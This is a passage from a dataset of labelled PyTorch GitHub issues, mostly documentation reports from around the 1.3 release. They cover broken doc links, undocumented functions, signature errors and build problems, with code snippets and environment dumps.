File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/mdtk/pytorch_trainers.py\", line 220, in iteration\r\n    model_output = self.model.forward(input_data, input_lengths)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/mdtk/pytorch_models.py\", line 49, in forward\r\n    self.hidden = self.init_hidden(batch_size, device=device)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/mdtk/pytorch_models.py\", line 40, in init_hidden\r\n    return (torch.randn(1, batch_size, self.hidden_dim, device=device),\r\nRuntimeError: CUDA error: no kernel image is available for execution on the device\r\n```\r\n\r\nFirst tried downgrading to cudatoolkit=10.0, that exhibited same issue.\r\n\r\nThe code will run fine if you repeat steps above but instead `conda install pytorch=1.2 cudatoolkit=10.0 -c pytorch`.\r\n\r\n\r\n## Expected behavior\r\nIf no longer supporting a specific GPU, please bomb out upon load with useful error message.\r\n\r\n\r\n## Environment\r\n\r\nUnfort ran your script after I 'fixed' so pytorch version will be 1.2 here - issue encountered with version 1.3.\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.2.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: Scientific Linux release 7.6 (Nitrogen)\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-36)\r\nCMake version: version 2.8.12.2\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration: GPU 0: Tesla K40m\r\nNvidia driver version: 430.50\r\ncuDNN version: /usr/lib64/libcudnn.so.6.5.18\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.16.3\r\n[pip3] numpydoc==0.8.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.4                      243  \r\n[conda] mkl-service               2.3.0            py37he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py37ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py37hd6b4f25_0  \r\n[conda] pytorch                   1.2.0           py3.7_cuda10.0.130_cudnn7.6.2_0    pytorch\r\n[conda] torchvision               0.4.0                py37_cu100    pytorch\r\n```\r\n\n\ncc @ezyang @gchanan @zou3519 @jerryzh168 @ngimel"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nIs it possible to provide a timestamp to when a tutorial was last updated in the docs, this could also be applied to modules in docs, like\r\n```\r\nnn.Flatten\r\nlast updated - time\r\n```"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/storage.html#torch.FloatStorage.from_buffer\r\n\r\nThis method is useful when ingesting byte streams/arrays from external programs like sox or ffmpeg."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe docs page currently contains a link to \"torch.__config__\" in the left sidebar under Python API.\r\n\r\nThis link leads to a dead end (https://pytorch.org/docs/stable/__config__.html).\r\n\r\nThe link or the sidebar should be updated. \r\n\r\nThanks!\r\n-Dan"},{"labels":[null,"documentation",null],"text":"## 🚀 Feature\r\nAlong with all the instructions for local installation on https://pytorch.org/get-started/locally/ it would be great to also add a few lines about Google Colab notebooks. \r\n\r\n## Motivation\r\nColab notebooks already set up with all required libraries pre-installed. It saves time, and users don't have to deal with errors while building or installing. All the work already done. Also, it would be a great place to start because the already existing Colab notebooks can be imported without any hassle.\r\n\r\n## Pitch\r\nNA\r\n\r\n## Alternatives\r\nNA\r\n\r\n## Additional context\r\nNA"},{"labels":["documentation",null],"text":"## ❓ Issue\r\n\r\nBuilding a minimal C++ application which loads a torch script model results in:\r\n`LINK : fatal error LNK1181: cannot open input file 'torch-NOTFOUND.obj'`\r\n\r\n## Reproduce\r\n\r\nFollow the guidelines from PyTorch documentation ([this ](https://pytorch.org/tutorials/advanced/cpp_export.html) and [this](https://pytorch.org/cppdocs/installing.html#minimal-example)). \r\n\r\nThe issue occurs when executing the following commands:\r\n```\r\nmkdir build\r\ncd build\r\ncmake -DCMAKE_PREFIX_PATH=/absolute/path/to/libtorch ..\r\ncmake --build .\r\n```\r\n\r\nThe first guide says to run `cmake make`, which does not work for Visual Studio at all.\r\n\r\nBuilding succeeds on condition that Release configuration is specified:\r\n`cmake --build . --config Release`. Other configurations (MinSizeRel, RelWithDebInfo and the default one fail with the aforementioned linker error).\r\n\r\n## Environment\r\n\r\nLibTorch 1.3 stable, release, CPU\r\nWindows 8.1 x64\r\nVisual Studio 2019 Community (with CMake component installed)\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nDocumentation for [torch.svd](https://pytorch.org/docs/stable/torch.html#torch.svd) does not indicate whether or not singular values are returned in descending order. My suspicion is that they are since both LAPACK and MAGMA's ?gesdd return them in descending order. It seems like this should be clarified in the docs to avoid unnecessary sorting, or mistaken assumptions.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nCame up in comments for https://github.com/pytorch/pytorch/pull/30208. A class called `RpcBackendOptions` is used to pass in certain arguments (like store init method, timeout) to the RPC backend - we should add docs for this and explain what options can be set.\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528"},{"labels":["documentation",null],"text":"![pytorch-quantization-bug-rendering-QConfig](https://user-images.githubusercontent.com/45861273/69389653-82068000-0c81-11ea-9257-cb0f966ff4a3.png)\r\n\r\n\r\nwhat is going on with QConfig()\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":[null,"documentation",null,null,null,null],"text":"The doc says that `eps` helps preventing division by zero (without mentioning how).  The actual implementation is \r\nhttps://github.com/pytorch/pytorch/blob/0fdbb762d1a9e6b9c262760b6b67bcb3d0814407/aten/src/ATen/native/Distance.cpp#L15-L17\r\n\r\nHowever, `norm(zero_vector)` is perfectly stable and gives correct subgradient. So unless `pairwise_dist` output is used as a denominator, there is no DBZ or any instability. And how to use `pairwise_dist` output should be in users' control, unless we want to automatically add `eps` to every op that can output zeros.\r\n\r\nProposal: remove `eps` argument.\r\n\r\ncc @ezyang @SsnL @gchanan"},{"labels":[null,"documentation",null,null],"text":"It seems to copy:\r\n```python\r\nimport torch\r\na = torch.rand(3, 3)\r\nprint(a.data_ptr(), a.conj().data_ptr()) # 94290110120192 94290110120320\r\n```\r\n\r\nHowever, if the caller wants to save memory for real tensors and does not use inplace ops, they need to do ifs (and enumerate all complex types) like in https://github.com/pytorch/pytorch/pull/29488/files#diff-62a3ecc69398a4b080599d5222c535b1R70\r\n\r\nAlso this copy semantics seems not documented: https://pytorch.org/docs/master/torch.html?highlight=conj#torch.conj\n\ncc @VitalyFedyunin @ngimel @mruberry"},{"labels":["documentation",null],"text":"![image](https://user-images.githubusercontent.com/1041752/69262021-fcbc9600-0bc2-11ea-97af-236226678212.png)\r\n"},{"labels":["documentation",null,null],"text":"The `remote`/`rpc_sync`/`rpc_async` APIs are listed as `torch.distributed.rpc.api.*` in our doc. The `.api` segment should not appear there.\r\n\r\n![Screen Shot 2019-11-18 at 12 22 31 PM](https://user-images.githubusercontent.com/16999635/69074832-224c7280-09fe-11ea-9fa8-72ffc568ac60.png)\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528"},{"labels":["documentation",null,null],"text":"The doc now looks like below. I would assume the path was not intended to be there?\r\n\r\n<img width=\"877\" alt=\"Screen Shot 2019-11-14 at 4 12 15 PM\" src=\"https://user-images.githubusercontent.com/16999635/68906684-fb3e2a00-06f9-11ea-812a-90e66aecc787.png\">\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nI think the documentation shouldn't include an _out=_ option,\r\nI don't see any _unsqueeze_out()_ function in ATen..\r\n\r\n```\r\n>>> torch.unsqueeze(torch.tensor([1,2.0]),-1,out=r)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: unsqueeze() got an unexpected keyword argument 'out'\r\n```"},{"labels":["documentation",null,null],"text":"test_docs_coverage does not cover quantization.rst. It should. \r\n\r\nhttps://github.com/pytorch/pytorch/issues/27938\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":["documentation",null],"text":"The following works:\r\n```\r\n>>> torch.__version__\r\n'1.4.0a0+5635a72'\r\n\r\n>>> x.mean(dtype=torch.float)\r\ntensor(1.5000)\r\n>>> help(x.mean)\r\n\r\n>>> x.mean(dim=1, dtype=torch.float)\r\ntensor([1.6667, 1.3333])\r\n\r\n```\r\n\r\nYet the doc doesn't say anything about the `dtype` argument:\r\n```\r\nHelp on built-in function mean:\r\n\r\nmean(...) method of torch.Tensor instance\r\n    mean(dim=None, keepdim=False) -> Tensor or (Tensor, Tensor)\r\n\r\n    See :func:`torch.mean`\r\n```"},{"labels":["documentation",null],"text":"From Supriya \r\nCan we add a note on the quantization page about setting the qengine to \"qnnpack\" if running on mobile? \r\nhttps://discuss.pytorch.org/t/fbgemm-with-pytorch-mobile/60752/4\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a"},{"labels":[null,"documentation",null],"text":""},{"labels":[null,"documentation",null],"text":"https://pytorch.org/docs/stable/nn.html#torch.nn.Conv2d \r\n\r\nAll there is is\r\n`padding_mode (string, optional) – zeros`"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nFor our 1.4 RC, we should have a simple hello-world style tutorial that shows users how to use the model parallel/rpc APIs for simple multi-machine/ParameterServer training. The examples can be simple and concise such as the ones given in https://github.com/pytorch/pytorch/issues/23110, but should have a detailed walkthrough explaining the concepts and APIs used.\r\n\r\ncc @ezyang @gchanan @zou3519 @jerryzh168 @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nThese instructions are missing and we should add them.\r\n\r\nBasically:\r\n* Install pkg-config\r\n* Install libuv\r\n* Compile with `USE_LIBUV=ON`\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe Tensor documentation page has broken links to torchtext, torchaudio, and C++ API. These broken links do not appear on the main documentation page.\r\n\r\nhttps://pytorch.org/docs/stable/tensors.html\r\n\r\n<img width=\"435\" alt=\"Screen Shot 2019-11-01 at 1 23 03 PM\" src=\"https://user-images.githubusercontent.com/655866/68043204-1f861980-fcab-11e9-9327-8f05b4b350b9.png\">"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nIn-place functions are documented inconsistently. For example functions that generate samples from a distribution have a section called \"In-place random sampling\", however there is no other documentation for other in-place functions.\r\n\r\nFor example `pow_()` and `log_()` are not documented anywhere. Other in-place functions like `fill_()` are referenced in example code but not mentioned.\r\n\r\nIt would be good to document all in-place functions that are first-class citizens. Or tag functions in some way that have an in-place variant.\r\n"},{"labels":["documentation",null,null],"text":"how do we get the size of a particular named dimension ? Today, I get it as shown below, but it seems round about. Is there a better way to doing the same ?\r\n\r\n```\r\n>>> t = torch.zeros((3, 224, 400), names=('C', 'H', 'W'))\r\n>>> \r\n>>> t.shape[t.names.index('H')]\r\n224\r\n\n\ncc @zou3519"},{"labels":["documentation",null,null],"text":"`distributed_c10d` has a nice doc page [here](https://pytorch.org/docs/stable/distributed.html), and the source code of that live in [here](https://github.com/pytorch/pytorch/blob/master/docs/source/distributed.rst). We should add a similar page for rpc and distributed autograd to describe the API.\r\n\r\n@rohan-varma brought up a point that whether we want to add the new docs into the existing `distributed.rst` file as `distributed/distributed_c10d.py`, `distributed/rpc/` and `distributed/autograd` all live in the same `distributed/` folder, or whether we want to keep them in separate files. I would vote for keeping them separate from the existing one, as the existing one mostly focus on c10d, and the new ones are on rpc/autograd, which are quite different topics. The following items would need more discussion and let's track them here:\r\n\r\n1. The title of the existing `distributed.rst` page says **Distributed communication package - torch.distributed**, do we want to rename that to _Distributed collective communication package - torch.distributed_ to be more precise?\r\n2. Should rpc and distributed autograd api docs live in the same file? \r\n\r\n \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe documentation pages can be viewed for different versions using the [versions page](https://pytorch.org/docs/versions.html). However, when navigating to the \"Tutorials\", the versions cannot be selected. This is a problem for the experimental parts (s.a. quantization), as we update the tutorials in master, which cannot be viewed."},{"labels":["documentation",null],"text":"As discussed in this issue in the forum: https://discuss.pytorch.org/t/font-in-the-instructions-are-not-sharp-in-chrome-browser/59365/2\r\n\r\nThe font is not always sharp for all users\r\n\r\ncc @jlin27 "},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe torch.from_file function is not documented. Only the [torch.Storage.from_file](https://pytorch.org/docs/stable/storage.html#torch.FloatStorage.from_file) is documented, but it's not clear how to create a Tensor from that function. Specifically, it requires knowing that you can construct a Tensor from a storage using the constructor `torch.Tensor(storage)`. That constructor is no longer documented."},{"labels":["documentation",null],"text":"Even if it is internal/experimental, it's quite useful for end users as well.\r\n\r\nCurently [`fuse_conv_bn_weights`](https://github.com/pytorch/pytorch/blob/master/torch/nn/utils/fusion.py#L22) assumes 2d convolution and hard-codes 4-dim weights, which is not true for Conv1d/Conv3d. However it's easy to support any dimension:\r\n```python\r\n# conv_w = conv_w * (bn_w * bn_var_rsqrt).reshape([-1, 1, 1, 1])\r\nconv_w = conv_w * (bn_w * bn_var_rsqrt).reshape([-1] + [1] * (len(conv_w.shape) - 1))\r\n```"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/nn.html?highlight=multiheadattention#torch.nn.MultiheadAttention currently looks like this:\r\n\r\n- **Note** – if kdim and vdim are None, they will be set to embed_dim such that\r\n- **key, and value have the same number of features.** (*query,*) –\r\n\r\ni.e. formatting went badly.\r\n\r\nAlso docs don't mention that `embed_dim` must be divisible by `nheads` and what's the reason for this requirement (it seems that the module assumes that the projection of the all heads is done prior to this module)"},{"labels":[null,"documentation",null,null],"text":"flatten_parameters missing docs online: https://pytorch.org/docs/master/search.html?q=flatten_parameters&check_keywords=yes&area=default\r\n\r\nWhile docs are there in the code:\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/nn/modules/rnn.py#L99\n\ncc @ezyang @gchanan @zou3519 @jerryzh168"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nHere in the description of resize:\r\n`\r\nThis is a low-level method. The storage is reinterpreted as C-contiguous, ignoring the current strides (unless the target size equals the current size, in which case the tensor is left unchanged). For most purposes, you will instead want to use view(), which checks for contiguity, or reshape(), which copies data if needed. To change the size in-place with custom strides, see set_().\r\n`\r\n\r\n`as_strided_` has clearer semantics than `set_` (which can also change the storage, which isn't relevant for the situation in question."},{"labels":[null,null,null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nEven the official [docs for cpp extensions](https://pytorch.org/tutorials/advanced/cpp_extension.html) use `gates.data<scalar_t>()` but I get deprecation warning.\r\n\r\n## To Reproduce\r\n\r\n>  warning: ‘T* at::Tensor::data() const [with T = float]’ is deprecated [-Wdeprecated-declarations]                                                                                                                               /home/ehazar/miniconda3/envs/py3_night/lib/python3.6/site-packages/torch/include/ATen/core/TensorBody.h:312:1: note: declared here                                                                                                                                                 T * data() const {\r\n\r\n\r\n## Expected behavior\r\n\r\nProvide a non-deprecated way for cpp extensions. Similarly, no alternative to `AT_CHECK`/`AT_ASSERTM` nor `torch::jit::RegisterOperators()` is provided for cpp extensions.\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.4.0.dev20191018\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0\r\n\r\nOS: Ubuntu 16.04.6 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration: GPU 0: GeForce GTX 1070\r\nNvidia driver version: 418.40.04\r\ncuDNN version: /usr/local/lib/libcudnn.so.5.1.10\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.17.2\r\n[pip] torch==1.4.0.dev20191018\r\n[pip] torchvision==0.5.0a0+155c504\r\n[conda] Could not collect\r\n\n\ncc @yf225"},{"labels":[null,"documentation",null,null,null,null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nCurrently the signature of `torch.addcdiv` is documented to be:\r\n\r\n```\r\naddcdiv(input, value=1, tensor1, tensor2, out=None) -> Tensor\r\n```\r\n\r\nSee e.g. https://pytorch.org/docs/stable/torch.html#torch.addcdiv\r\n\r\nThis can't be correct because it has positional arguments following keyword arguments, which is invalid in Python.\r\n\r\nWhen I intentionally pass an invalid number of arguments, I get:\r\n\r\n```\r\nIn [10]: torch.addcdiv(t, 0.1)\r\n---------------------------------------------------------------------------\r\nTypeError                                 Traceback (most recent call last)\r\n<ipython-input-10-38c653649e23> in <module>\r\n----> 1 torch.addcdiv(t, 0.1)\r\n\r\nTypeError: addcdiv() received an invalid combination of arguments - got (Tensor, float), but expected (Tensor input, Tensor tensor1, Tensor tensor2, Number value, Tensor out)\r\n```\r\n\r\nSo I guess `value` *is* optional and it should be moved to the end of the argument list.  However, I wanted to double check before putting in a PR with the fix since that means that the doctest in the docstring for `addcdiv` is incorrect.\n\ncc @ezyang @gchanan @zou3519 @jerryzh168 @SsnL"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n`default_qconfig` doesn't exist as an attribute, so it is better to label it as ``default_qconfig``\r\n![image](https://user-images.githubusercontent.com/5652049/66953340-5235de00-f02c-11e9-92c5-6719ccca7ff3.png)\r\n\r\n_Originally posted by @zou3519 in https://github.com/_render_node/MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDMzNTY3NTE3Mw==/comments/review_comment_\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nHey folks, there is a `__config__` section showing up in the docs which leads to a 404 page; see\r\n- https://pytorch.org/docs/stable/index.html\r\n- https://pytorch.org/docs/stable/__config__.html\r\n\r\nSee screenshot below\r\n\r\n![torch-config](https://user-images.githubusercontent.com/527241/66940551-6b975400-f045-11e9-9bb4-555399ab72fe.png)\r\n\r\nShould probably be removed or the linked page fixed; thanks!"},{"labels":[null,"documentation",null],"text":"Afaict TestTorch.test_doc tests that certain functions on torch are documented. This is similar to what TestDocCoverage does and it would be great to have all of the documentation tests in one single location.\r\n\r\nhttps://github.com/pytorch/pytorch/blob/fd3d6587e60de816106d6b8dc0f586f9fa52a7ac/test/test_torch.py#L183\n\ncc @ezyang @zou3519"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nFor example: https://pytorch.org/docs/stable/quantization.html#torch-nn-quantized-functional\r\n\r\n![Screen Shot 2019-10-14 at 2 34 10 PM](https://user-images.githubusercontent.com/4216323/66784641-ec145400-ee8f-11e9-8404-3717bad82df8.png)\r\n\r\nThis also includes #27849\r\n\r\n\r\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/stable/onnx.html#torch.onnx.export\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/66771893-71e0d100-ee89-11e9-9ef1-6004b6fc2373.png)\r\n"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nhttps://pytorch.org/docs/master/optim.html#torch.optim.lr_scheduler.CosineAnnealingWarmRestarts\r\n\r\n![image](https://user-images.githubusercontent.com/10709657/66767963-1b54b080-eee4-11e9-92bf-71d0d176d8f0.png)\r\n![image](https://user-images.githubusercontent.com/10709657/66767998-2dceea00-eee4-11e9-90b1-41440665df6b.png)\r\n\n\ncc @vincentqb"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/master/nn.functional.html#torch.nn.functional.kl_div\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/66766584-6804a100-ee7c-11e9-9c32-fb9dd7cde5b8.png)\r\n\r\n"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/stable/named_tensor.html#explicit-alignment-by-names\r\n\r\n```\r\nscale = torch.randn(num_channels, names='C')\r\n```\r\nshould be `scale = torch.randn(num_channels, names=['C'])`\n\ncc @zou3519"},{"labels":[null,"documentation",null],"text":"The documentation has an[entry for it](https://github.com/pytorch/pytorch/blob/master/docs/source/cuda.rst), but the documentation website [doesn't have it](https://pytorch.org/docs/master/cuda.html)."},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nWhile working on fixing #25347, I found out that `torch.lgamma` appears to be undocumented.\r\n\r\n```\r\n>>> import torch\r\n>>> help(torch.lgamma)\r\nHelp on built-in function lgamma:\r\n\r\nlgamma(...)\r\n```\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,null,"documentation",null],"text":"https://github.com/pytorch/pytorch/blob/master/docs/source/torch.rst (scroll down to default_generators)\n\ncc @ezyang @gchanan @zou3519 @jerryzh168"},{"labels":[null,"documentation",null,null],"text":"We are missing documentation for:\r\n- cuda.get_rng_state_all\r\n- cuda.set_rng_state_all\r\n- cuda.manual_seed_all\r\n- cuda.seed_all\r\n\r\nIn torch.random: https://pytorch.org/docs/master/random.html"},{"labels":[null,"documentation",null],"text":"Some of our docs link to \"CUDA documentation\" render incorrectly:\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/66680833-414d2d00-ec26-11e9-8347-5da72167ccb5.png)\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nHere: https://pytorch.org/docs/master/optim.html?highlight=cycliclr#torch.optim.lr_scheduler.CyclicLR\r\n\r\n![image](https://user-images.githubusercontent.com/10709657/66622721-5f616000-ec1b-11e9-81b2-f0a6b999ee24.png)\r\n\r\nthe three built-in policies can be illustrated in the Parameter section.\r\n\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @vincentqb"},{"labels":[null,"documentation",null,null],"text":"I see the pytorch1.3 is now available, quantization is added, greate! but as the description：\r\n '\"\"This currently experimental feature includes support for post-training quantization, dynamic quantization, and quantization-aware training. It leverages the FBGEMM and QNNPACK state-of-the-art quantized kernel back ends, for x86 and ARM CPUs, respectively, which are integrated with PyTorch and now share a common API.\r\n\"\"\"\r\n\r\nmeans the quantizationed model can only use the FBGEMM and QNNPACK(cpu backends) and cannot deploy the quantizationed model with cuda backend?\r\nmeans now all the pytorch's  quantization ops are created just for cpus like arm and x86?\r\n\r\nThank you!\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":[null,"documentation",null],"text":"We should ideally be able to build all the docs in a single command. Right now we build the docs for pytorch and torchvision separately and \"copy and paste\" the docs for torchvision into pytorch. This is not very efficient and it's easy to forget this last step. \n\ncc @ezyang"},{"labels":[null,"documentation",null],"text":"Right now, we require a CUDA installation of pytorch to build docs. I think this is necessary for the following reasons:\r\n\r\n- Some of our operators are \"turned off\" in a CPU-only build\r\n- torch.distributed is \"turned off\" in a CPU-only build.\r\n\r\nIt would be nice to refactor the code such that all docstrings and APIs are available in a CPU-only build and error out gracefully instead of having those APIs be completely missing.\r\n\r\nThis would speed up documentation building time; we wouldn't have to wait for a full CUDA build of pytorch.\n\ncc @ezyang"},{"labels":["documentation",null],"text":"There were some other pip packages that I needed to install that I don't remember right now.\r\n\r\nFurthermore, the docs require the following that we should document somewhere:\r\n- global installation from katex\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nafter our v1.3.0 doc changes i am seeing a test failure\r\n\r\nFAIL: test_torch (__main__.TestDocCoverage)\r\n\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. git checkout upstream master\r\n2. python ./test/test_docs_coverage.py\r\n\r\nAssertionError: Items in the second set but not the first:\r\n'real'\r\n'imag'\r\n'conj'\r\n'angle' : \r\nThe lists of tensor methods documented in tensors.rst and in python are\r\ndifferent. Did you forget to add a new thing to tensors.rst, or whitelist\r\nthings you don't want to document?\r\n\r\n======================================================================\r\nFAIL: test_torch (__main__.TestDocCoverage)\r\n----------------------------------------------------------------------\r\nTraceback (most recent call last):\r\n  File \"./test/test_docs_coverage.py\", line 73, in test_torch\r\n    don't want to document?''')\r\nAssertionError: Items in the first set but not the second:\r\n'promote_types'\r\n'result_type'\r\n'can_cast'\r\nItems in the second set but not the first:\r\n'quantize_per_tensor'\r\n'quantize_per_channel' : \r\nThe lists of functions documented in torch.rst and in python are different.\r\nDid you forget to add a new thing to torch.rst, or whitelist things you\r\ndon't want to document?\r\n\r\n----------------------------------------------------------------------\r\nRan 2 tests in 0.003s\r\n\r\nFAILED (failures=2)\r\n\r\n## Expected behavior\r\n\r\n\r\ngit checkout pr-fix-doc-test-failure\r\n\r\ngottbrath@ubuntu:~/pytorch-for-doc$ python ./test/test_docs_coverage.py \r\n..\r\n----------------------------------------------------------------------\r\nRan 2 tests in 0.003s\r\n\r\nOK\r\n\r\n\r\n\n\ncc @ezyang"},{"labels":[null,null,"documentation",null,null],"text":"When the model does not contain a custom layer, it can be deployed directly on the C + + side using JIT mechanism and libtorch library.\r\n\r\nBut my model contains a custom c++ and CUDA layer. Now that I'm deploying the model on the c++ side, do I need to compile the custom c++ and CUDA layers into the libtorch library?\r\nThank you!!!\n\ncc @suo @yf225"},{"labels":["documentation",null],"text":"## ❓ Questions and Help\r\n\r\n\r\nIf want to add Bert for pytorch community,  can I put the models and weights of BERT into the repository of **pytorch/text** ?\r\nAs **pytorch/vision**  is for Models specific to Computer Vision,  but i can't find any NLP models in   **pytorch/text**"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nAssigning `nn.Module`s as attributes of an `nn.Sequential` will append them to the \"execution list\" and therefore automatically call in `forward`, instead of merely registering them for inclusion in `nn.Sequential.parameters()`. This is not mentioned in the documentation.\r\n\r\n## To Reproduce\r\nRunning the following code:\r\n\r\n```python\r\nclass CustomSeq(nn.Sequential):\r\n    def __init__(self):\r\n        super(CustomSeq, self).__init__(\r\n            nn.Linear(3, 4),\r\n            nn.Linear(4, 5),\r\n        )\r\n\r\n        self.bar = nn.Linear(4, 5)\r\n\r\nnet = CustomSeq()\r\nprint(net)\r\n```\r\nwill result in\r\n\r\n```\r\nCustomSeq(\r\n  (0): Linear(in_features=3, out_features=4, bias=True)\r\n  (1): Linear(in_features=4, out_features=5, bias=True)\r\n  (bar): Linear(in_features=4, out_features=5, bias=True)\r\n)\r\n```\r\n\r\nand fail when passed an `N x 3` tensor (because of 5 vs 4 shape mismatch at the end of execution).\r\n\r\n## Expected behavior\r\n\r\nI am not sure what the print format should be, but ideally I would like to see that only the modules passed in the constructor are executed in `forward` (the [documentation](https://pytorch.org/docs/master/nn.html#torch.nn.Sequential) only mentions constructors) and the modules added via `__setattr__` would be treated as if they were assigned to a regular `nn.Module`, that is registered but not automatically executed. Another solution would be to just document this as a feature.\r\n\r\nMy preference for the former is that I have code which looks like this\r\n```python\r\nclass CustomSeq(nn.Sequential):\r\n    def __init__(self):\r\n        meta = MetaParameterModule(...)\r\n        super(CustomSeq, self).__init__(\r\n            CustomLayer(meta, ...),\r\n            CustomLayer(meta, ...),\r\n            ...\r\n        )\r\n        self.meta = meta\r\n```\r\nwhere `MetaParameterModule` doesn't even implement `forward`, it just stores some learnable interpolation parameters global to `CustomSeq`, which I would like to easily access. I was very surprised seeing that running `CustomSeq()(input)` results in `NotImplementedError`. I can obviously workaround with something like\r\n\r\n```python\r\n@property\r\ndef meta(self):\r\n    return self[0].meta\r\n```\r\nbut it's a bit awkward.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.2.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Ubuntu 18.04.3 LTS\r\nGCC version: (Ubuntu 